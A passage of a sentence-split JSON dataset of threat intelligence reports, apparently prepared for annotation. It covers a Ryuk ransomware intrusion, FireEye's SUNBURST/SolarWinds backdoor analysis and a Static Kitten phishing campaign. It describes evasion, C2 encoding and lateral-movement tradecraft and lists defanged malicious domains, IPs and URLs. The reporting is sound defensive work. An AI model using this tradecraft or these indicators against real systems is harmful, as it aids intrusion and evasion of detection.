        "report": "r-62",
        "line": 26,
        "index": 133
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S27",
        "text": "Nltest was used to check for Domain trusts\n",
        "type": "",
        "report": "r-62",
        "line": 27,
        "index": 134
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S28",
        "text": "Net was used to show Domain Admins\n",
        "type": "",
        "report": "r-62",
        "line": 28,
        "index": 135
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S29",
        "text": "Ping was used to test if systems were up in the environment\n",
        "type": "",
        "report": "r-62",
        "line": 29,
        "index": 136
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S30",
        "text": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.\n",
        "type": "",
        "report": "r-62",
        "line": 30,
        "index": 137
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S31",
        "text": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.\n",
        "type": "",
        "report": "r-62",
        "line": 31,
        "index": 138
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S32",
        "text": "WMI was used to check for the current AntiVirus on numerous systems\n",
        "type": "",
        "report": "r-62",
        "line": 32,
        "index": 139
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S33",
        "text": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "type": "",
        "report": "r-62",
        "line": 33,
        "index": 140
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S34",
        "text": "The system was not vulnerable to MS17-010\n",
        "type": "",
        "report": "r-62",
        "line": 34,
        "index": 141
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S35",
        "text": "Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller.",
        "type": "",
        "report": "r-62",
        "line": 35,
        "index": 142
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S36",
        "text": "From there, the threat actor used WMIC to execute the beacon.\n",
        "type": "",
        "report": "r-62",
        "line": 36,
        "index": 143
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S37",
        "text": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.\n",
        "type": "",
        "report": "r-62",
        "line": 37,
        "index": 144
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S38",
        "text": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.\n",
        "type": "",
        "report": "r-62",
        "line": 38,
        "index": 145
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S39",
        "text": "At this point, C2 connections appear on the domain controller connecting to martahzz[.]com \u2013 88.119.171[.]75 over 443/https.\n",
        "type": "",
        "report": "r-62",
        "line": 39,
        "index": 146
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S40",
        "text": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.\n",
        "type": "",
        "report": "r-62",
        "line": 40,
        "index": 147
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S41",
        "text": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.\n",
        "type": "",
        "report": "r-62",
        "line": 41,
        "index": 148
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S42",
        "text": "Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.\n",
        "type": "",
        "report": "r-62",
        "line": 42,
        "index": 149
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S43",
        "text": "SMB was used to transfer the Ryuk executables.",
        "type": "",
        "report": "r-62",
        "line": 43,
        "index": 150
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S44",
        "text": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
        "type": "",
        "report": "r-62",
        "line": 44,
        "index": 151
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S45",
        "text": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "type": "",
        "report": "r-62",
        "line": 45,
        "index": 152
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S46",
        "text": "Commands ran prior to ransom execution\n",
        "type": "",
        "report": "r-62",
        "line": 46,
        "index": 153
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S47",
        "text": "All systems were left with the following ransom note:\n",
        "type": "",
        "report": "r-62",
        "line": 47,
        "index": 154
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S48",
        "text": "The threat actors asked for more than $6 million but were willing to negotiate.\n",
        "type": "",
        "report": "r-62",
        "line": 48,
        "index": 155
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S0",
        "text": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.",
        "type": "",
        "report": "r-68",
        "line": 0,
        "index": 156
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S1",
        "text": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "type": "",
        "report": "r-68",
        "line": 1,
        "index": 157
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S2",
        "text": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "type": "",
        "report": "r-68",
        "line": 2,
        "index": 158
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S3",
        "text": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "type": "",
        "report": "r-68",
        "line": 3,
        "index": 159
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S4",
        "text": "Post compromise activity following this supply chain compromise has included lateral movement and data theft.",
        "type": "",
        "report": "r-68",
        "line": 4,
        "index": 160
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S5",
        "text": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "type": "",
        "report": "r-68",
        "line": 5,
        "index": 161
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S6",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "type": "",
        "report": "r-68",
        "line": 6,
        "index": 162
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S7",
        "text": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.\n",
        "type": "",
        "report": "r-68",
        "line": 7,
        "index": 163
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S8",
        "text": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services.",
        "type": "",
        "report": "r-68",
        "line": 8,
        "index": 164
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S9",
        "text": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "type": "",
        "report": "r-68",
        "line": 9,
        "index": 165
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S10",
        "text": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "type": "",
        "report": "r-68",
        "line": 10,
        "index": 166
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S11",
        "text": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp\n",
        "type": "",
        "report": "r-68",
        "line": 11,
        "index": 167
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S12",
        "text": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "type": "",
        "report": "r-68",
        "line": 12,
        "index": 168
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S13",
        "text": "Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).",
        "type": "",
        "report": "r-68",
        "line": 13,
        "index": 169
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S14",
        "text": "After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.",
        "type": "",
        "report": "r-68",
        "line": 14,
        "index": 170
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S15",
        "text": "The DNS response will return a CNAME record that points to a Command and Control (C2) domain.",
        "type": "",
        "report": "r-68",
        "line": 15,
        "index": 171
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S16",
        "text": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "type": "",
        "report": "r-68",
        "line": 16,
        "index": 172
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S17",
        "text": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "type": "",
        "report": "r-68",
        "line": 17,
        "index": 173
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S18",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "type": "",
        "report": "r-68",
        "line": 18,
        "index": 174
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S19",
        "text": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer and execute files, profile the system, and disable system services.",
        "type": "",
        "report": "r-68",
        "line": 19,
        "index": 175
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S20",
        "text": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "type": "",
        "report": "r-68",
        "line": 20,
        "index": 176
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S21",
        "text": "The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers.",
        "type": "",
        "report": "r-68",
        "line": 21,
        "index": 177
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S22",
        "text": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims\n",
        "type": "",
        "report": "r-68",
        "line": 22,
        "index": 178
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S23",
        "text": "- Command and control traffic masquerades as the legitimate Orion Improvement Program\n",
        "type": "",
        "report": "r-68",
        "line": 23,
        "index": 179
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S24",
        "text": "- Code hides in plain site by using fake variable names and tying into legitimate components\n",
        "type": "",
        "report": "r-68",
        "line": 24,
        "index": 180
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S25",
        "text": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "type": "",
        "report": "r-68",
        "line": 25,
        "index": 181
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S26",
        "text": "The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report.",
        "type": "",
        "report": "r-68",
        "line": 26,
        "index": 182
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S27",
        "text": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "type": "",
        "report": "r-68",
        "line": 27,
        "index": 183
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S28",
        "text": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "type": "",
        "report": "r-68",
        "line": 28,
        "index": 184
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S29",
        "text": "Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor.",
        "type": "",
        "report": "r-68",
        "line": 29,
        "index": 185
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S30",
        "text": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "type": "",
        "report": "r-68",
        "line": 30,
        "index": 186
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S31",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "type": "",
        "report": "r-68",
        "line": 31,
        "index": 187
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S32",
        "text": "The file was signed on March 24, 2020.",
        "type": "",
        "report": "r-68",
        "line": 32,
        "index": 188
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S33",
        "text": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "type": "",
        "report": "r-68",
        "line": 33,
        "index": 189
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S34",
        "text": "This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\".\n",
        "type": "",
        "report": "r-68",
        "line": 34,
        "index": 190
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S35",
        "text": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "type": "",
        "report": "r-68",
        "line": 35,
        "index": 191
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S36",
        "text": "The sample continues to check this time threshold as it is run by a legitimate recurring background task.",
        "type": "",
        "report": "r-68",
        "line": 36,
        "index": 192
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S37",
        "text": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "type": "",
        "report": "r-68",
        "line": 37,
        "index": 193
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S38",
        "text": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "type": "",
        "report": "r-68",
        "line": 38,
        "index": 194
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S39",
        "text": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "type": "",
        "report": "r-68",
        "line": 39,
        "index": 195
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S40",
        "text": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "type": "",
        "report": "r-68",
        "line": 40,
        "index": 196
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S41",
        "text": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "type": "",
        "report": "r-68",
        "line": 41,
        "index": 197
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S42",
        "text": "The userID is encoded via a custom XOR scheme after the MD5 is calculated.",
        "type": "",
        "report": "r-68",
        "line": 42,
        "index": 198
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S43",
        "text": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "type": "",
        "report": "r-68",
        "line": 43,
        "index": 199
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S44",
        "text": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "type": "",
        "report": "r-68",
        "line": 44,
        "index": 200
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S45",
        "text": "The sample then invokes the method Update which is the core event loop of the sample.\n",
        "type": "",
        "report": "r-68",
        "line": 45,
        "index": 201
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S46",
        "text": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "type": "",
        "report": "r-68",
        "line": 46,
        "index": 202
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S47",
        "text": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "type": "",
        "report": "r-68",
        "line": 47,
        "index": 203
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S48",
        "text": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "type": "",
        "report": "r-68",
        "line": 48,
        "index": 204
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S49",
        "text": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "type": "",
        "report": "r-68",
        "line": 49,
        "index": 205
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S50",
        "text": "These subdomains are concatenated with one of the following to create the hostname to resolve:\n",
        "type": "",
        "report": "r-68",
        "line": 50,
        "index": 206
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S51",
        "text": "Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists.",
        "type": "",
        "report": "r-68",
        "line": 51,
        "index": 207
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S52",
        "text": "Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components.",
        "type": "",
        "report": "r-68",
        "line": 52,
        "index": 208
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S53",
        "text": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "type": "",
        "report": "r-68",
        "line": 53,
        "index": 209
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S54",
        "text": "Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled.",
        "type": "",
        "report": "r-68",
        "line": 54,
        "index": 210
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S55",
        "text": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "type": "",
        "report": "r-68",
        "line": 55,
        "index": 211
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S56",
        "text": "The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples\u2019 config file.",
        "type": "",
        "report": "r-68",
        "line": 56,
        "index": 212
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S57",
        "text": "If any service was transitioned to disabled the Update method exits and retries later.",
        "type": "",
        "report": "r-68",
        "line": 57,
        "index": 213
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S58",
        "text": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "type": "",
        "report": "r-68",
        "line": 58,
        "index": 214
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S59",
        "text": "If any blocklisted driver is seen the Update method exits and retries.",
        "type": "",
        "report": "r-68",
        "line": 59,
        "index": 215
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S60",
        "text": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "type": "",
        "report": "r-68",
        "line": 60,
        "index": 216
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S61",
        "text": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "type": "",
        "report": "r-68",
        "line": 61,
        "index": 217
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S62",
        "text": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "type": "",
        "report": "r-68",
        "line": 62,
        "index": 218
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S63",
        "text": "The DNS",
        "type": "",
        "report": "r-68",
        "line": 63,
        "index": 219
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S64",
        "text": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "type": "",
        "report": "r-68",
        "line": 64,
        "index": 220
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S65",
        "text": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:\n",
        "type": "",
        "report": "r-68",
        "line": 65,
        "index": 221
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S66",
        "text": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "type": "",
        "report": "r-68",
        "line": 66,
        "index": 222
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S67",
        "text": "The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command.",
        "type": "",
        "report": "r-68",
        "line": 67,
        "index": 223
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S68",
        "text": "The HTTP thread will delay for a minimum of 1 minute between callouts.",
        "type": "",
        "report": "r-68",
        "line": 68,
        "index": 224
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S69",
        "text": "The malware uses HTTP GET or HTTP POST requests.",
        "type": "",
        "report": "r-68",
        "line": 69,
        "index": 225
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S70",
        "text": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".\n",
        "type": "",
        "report": "r-68",
        "line": 70,
        "index": 226
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S71",
        "text": "A JSON payload is present for all HTTP POST and PUT requests and contains the keys \u201cuserId\u201d, \u201csessionId\u201d, and \u201csteps\u201d.",
        "type": "",
        "report": "r-68",
        "line": 71,
        "index": 227
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S72",
        "text": "The \u201csteps\u201d field contains a list of objects with the following keys: \u201cTimestamp\u201d, \u201cIndex\u201d, \u201cEventType\u201d, \u201cEventName\u201d, \u201cDurationMs\u201d, \u201cSucceeded\u201d, and \u201cMessage\u201d.",
        "type": "",
        "report": "r-68",
        "line": 72,
        "index": 228
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S73",
        "text": "The JSON key \u201cEventType\u201d is hardcoded to the value \u201cOrion\u201d, and the \u201cEventName\u201d is hardcoded to \u201cEventManager\u201d.",
        "type": "",
        "report": "r-68",
        "line": 73,
        "index": 229
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S74",
        "text": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "type": "",
        "report": "r-68",
        "line": 74,
        "index": 230
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S75",
        "text": "Each \u201cMessage\u201d value is Base64 encoded separately.",
        "type": "",
        "report": "r-68",
        "line": 75,
        "index": 231
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S76",
        "text": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "type": "",
        "report": "r-68",
        "line": 76,
        "index": 232
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S77",
        "text": "Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response.\n",
        "type": "",
        "report": "r-68",
        "line": 77,
        "index": 233
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S78",
        "text": "In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present.",
        "type": "",
        "report": "r-68",
        "line": 78,
        "index": 234
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S79",
        "text": "Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\".",
        "type": "",
        "report": "r-68",
        "line": 79,
        "index": 235
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S80",
        "text": "Command data is spread across multiple strings that are disguised as GUID and HEX strings.",
        "type": "",
        "report": "r-68",
        "line": 80,
        "index": 236
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S81",
        "text": "All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded.",
        "type": "",
        "report": "r-68",
        "line": 81,
        "index": 237
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S82",
        "text": "The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following.",
        "type": "",
        "report": "r-68",
        "line": 82,
        "index": 238
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S83",
        "text": "The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed.",
        "type": "",
        "report": "r-68",
        "line": 83,
        "index": 239
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S84",
        "text": "The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters.",
        "type": "",
        "report": "r-68",
        "line": 84,
        "index": 240
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S85",
        "text": "Commands are then dispatched to a JobExecutionEngine based upon the command value as described next.\n",
        "type": "",
        "report": "r-68",
        "line": 85,
        "index": 241
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S0",
        "text": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "type": "",
        "report": "r-78",
        "line": 0,
        "index": 242
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S1",
        "text": "The URLs distributed through these phishing emails direct recipients to the intended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6]",
        "type": "",
        "report": "r-78",
        "line": 1,
        "index": 243
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S2",
        "text": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.\n",
        "type": "",
        "report": "r-78",
        "line": 2,
        "index": 244
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S3",
        "text": "The delivery URLs found to be part of this campaign are:\n",
        "type": "",
        "report": "r-78",
        "line": 3,
        "index": 245
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S4",
        "text": "File names in this campaign include:\n",
        "type": "",
        "report": "r-78",
        "line": 4,
        "index": 246
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S5",
        "text": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "type": "",
        "report": "r-78",
        "line": 5,
        "index": 247
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S6",
        "text": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "type": "",
        "report": "r-78",
        "line": 6,
        "index": 248
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S7",
        "text": "A similar second sample uses .docx file that tries to direct users to ws.onehub[.]com/files/94otjyvd which downloads a ZIP file called \u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip.",
        "type": "",
        "report": "r-78",
        "line": 7,
        "index": 249
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S8",
        "text": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "type": "",
        "report": "r-78",
        "line": 8,
        "index": 250
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S9",
        "text": "An overview of the infection chain is shown in Figure 1below.\n",
        "type": "",
        "report": "r-78",
        "line": 9,
        "index": 251
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S10",
        "text": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "type": "",
        "report": "r-78",
        "line": 10,
        "index": 252
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S11",
        "text": "The URLs are distributed through phishing emails with lure and decoy documents.",
        "type": "",
        "report": "r-78",
        "line": 11,
        "index": 253
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S12",
        "text": "An example lure is shown in Figure 2 below.",
        "type": "",
        "report": "r-78",
        "line": 12,
        "index": 254
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S13",
        "text": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "type": "",
        "report": "r-78",
        "line": 13,
        "index": 255
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S14",
        "text": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "type": "",
        "report": "r-78",
        "line": 14,
        "index": 256
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S15",
        "text": "A full translation of this document can be viewed in Appendix A. The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.\n",
        "type": "",
        "report": "r-78",
        "line": 15,
        "index": 257
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S16",
        "text": "The second file is a ZIP called \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip (see Figure 3).",
        "type": "",
        "report": "r-78",
        "line": 16,
        "index": 258
    },
    {
